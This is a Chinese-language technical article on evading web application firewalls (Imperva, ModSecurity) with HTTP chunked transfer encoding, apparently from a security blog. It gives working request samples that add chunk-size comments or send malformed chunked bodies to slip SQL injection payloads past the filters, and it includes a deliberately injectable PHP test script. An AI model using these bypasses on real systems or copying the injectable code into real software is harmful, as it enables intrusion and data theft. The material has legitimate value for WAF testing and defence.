# 分块传输

### 技巧1 使用注释扰乱分块数据包

一些如Imperva、360等比较好的WAF已经对Transfer-Encoding的分块传输做了处理，可以把分块组合成完整的HTTP数据包，这时直接使用常规的分块传输方法尝试绕过的话，会被WAF直接识别并阻断。

我们可以在\[[RFC7230\]](https://tools.ietf.org/html/rfc7230)中查看到有关分块传输的定义规范。

```
4.1.  Chunked Transfer Coding

   The chunked transfer coding wraps the payload body in order to
   transfer it as a series of chunks, each with its own size indicator,
   followed by an OPTIONAL trailer containing header fields.  Chunked
   enables content streams of unknown size to be transferred as a
   sequence of length-delimited buffers, which enables the sender to
   retain connection persistence and the recipient to know when it has
   received the entire message.

     chunked-body   = *chunk
                      last-chunk
                      trailer-part
                      CRLF

     chunk          = chunk-size [ chunk-ext ] CRLF
                      chunk-data CRLF
     chunk-size     = 1*HEXDIG
     last-chunk     = 1*("0") [ chunk-ext ] CRLF

     chunk-data     = 1*OCTET ; a sequence of chunk-size octets

   The chunk-size field is a string of hex digits indicating the size of
   the chunk-data in octets.  The chunked transfer coding is complete
   when a chunk with a chunk-size of zero is received, possibly followed
   by a trailer, and finally terminated by an empty line.

   A recipient MUST be able to parse and decode the chunked transfer
   coding.

4.1.1.  Chunk Extensions

   The chunked encoding allows each chunk to include zero or more chunk
   extensions, immediately following the chunk-size, for the sake of
   supplying per-chunk metadata (such as a signature or hash),
   mid-message control information, or randomization of message body
   size.

     chunk-ext      = *( ";" chunk-ext-name [ "=" chunk-ext-val ] )

     chunk-ext-name = token
     chunk-ext-val  = token / quoted-string

   The chunked encoding is specific to each connection and is likely to
   be removed or recoded by each recipient (including intermediaries)
   before any higher-level application would have a chance to inspect
   the extensions.  Hence, use of chunk extensions is generally limited
```

通过阅读规范发现分块传输可以在长度标识处加上分号“;”作为注释，如：

```
9;kkkkk
1234567=1
4;ooo=222
2345
0
(两个换行)
```

几乎所有可以识别Transfer-Encoding数据包的WAF，都没有处理分块数据包中长度标识处的注释，导致在分块数据包中加入注释的话，WAF就识别不出这个数据包了。

现在我们在使用了Imperva应用防火墙的网站测试常规的分块传输数据包：

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1
d
9
&a=1    and    
3
2=2
0
（两个换行）
```

返回的结果如下图所示。

[![img](https://p0.ssl.qhimg.com/dm/1024\_509\_/t01e68aae3729de0934.png)](https://p0.ssl.qhimg.com/dm/1024\_509\_/t01e68aae3729de0934.png)

可以看到我们的攻击payload “and 2=2”被Imperva的WAF拦截了。

这时我们将分块传输数据包加入注释符。

```
POST /xxxxxx.jsp HTTP/1.1
......
Transfer-Encoding: Chunked

9
xxxxxxxxx
9
xx=xxxxxx
9
xxxxxxxxx
1;testsdasdsad
d
9;test
&a=1    and    
3;test44444
2=2
0
(两个换行)
```

返回的结果如下图所示。

[![img](https://p1.ssl.qhimg.com/dm/1024\_512\_/t016a21d39c2ed6911a.png)](https://p1.ssl.qhimg.com/dm/1024\_512\_/t016a21d39c2ed6911a.png)

可以看到Imperva已经不拦截这个payload了。

### 技巧2 Bypass ModSecurity

众所周知ModSecurity是加载在中间件上的插件，所以不需要理会解析http数据包的问题，因为中间件已经帮它处理完了，那么无论使用常规的分块还是加了注释的分块数据包，ModSecurity都能直接获取到完整的http数据包然后匹配危险关键字，所以一些基于ModSecurity做的WAF产品难道就不受影响吗？

接下来我们在Apache+ModSecurity环境做测试。

sql.php代码如下：

```
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL);
$con = mysql_connect("localhost","root","");
if (!$con)
{
    die('Could not connect: ' . mysql_error());
}
mysql_select_db("test", $con);
$id = $_REQUEST["id"];
$sql = "select * from user where id=$id";
$result = mysql_query($sql,$con);
while($row = mysql_fetch_array($result))
{
    echo $row['name'] . " " . $row['password']."n";
}
mysql_close($con);
print "========GET==========n";
print_r($_GET);
print "========POST==========n";
print_r($_POST);
?>
<a href="sqli.php?id=1"> sdfsdf </a>
```

ModSecurity加载的规则拦截了请求包中的关键字“union”。

下面我们的请求和返回结果如下：

```
请求:
http://10.10.10.10/sql.php?id=2%20union

返回:
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /sql.php was not found on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

可以看到我们的“union”关键字被拦截了。

接下来我们传输一个畸形的分块数据包看看。

```
请求:
POST /sql.php?id=2%20union HTTP/1.1
......
Transfer-Encoding: chunked

1
aa
0
(两个换行)


返回:
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
========GET==========
Array
(
   [id] => 2 union
)
========POST==========
Array
(
)
```

可以看到虽然apache报错了，但是因为apache容错很强，所以我们提交的参数依然传到了php，而我们的ModSecurity并没有处理400错误的数据包，最终绕过了ModSecurity。

接下来我们把ModSecurity的规则改为过滤返回数据中包含“root”的字符串，然后在sql.php脚本中加入打印“root”关键字的代码。

接着我们做如下测试：

```
请求：
http://10.10.10.10/sql.php?id=1

返回:
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /sql.php
on this server.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
```

因为sql.php脚本中返回了带有“root”的关键字，所以直接就被ModSecurity拦截了。这时我们改为发送畸形的分块数据包。

```
请求:
POST /sql.php?id=1 HTTP/1.1
Host: 10.10.10.10
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 16

3
123
1
0
(两个换行)


返回:
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at 10.10.10.10 Port 80</address>
</body></html>
root 123456
========GET==========
Array
(
   [id] => 1
)
========POST==========
Array
(
)
```

通过两个测试可以发现使用畸形的分块数据包可以直接绕过ModSecurity的检测。这个问题我们在2017年4月已提交给ModSecurity官方，但是因为种种问题目前依然未修复
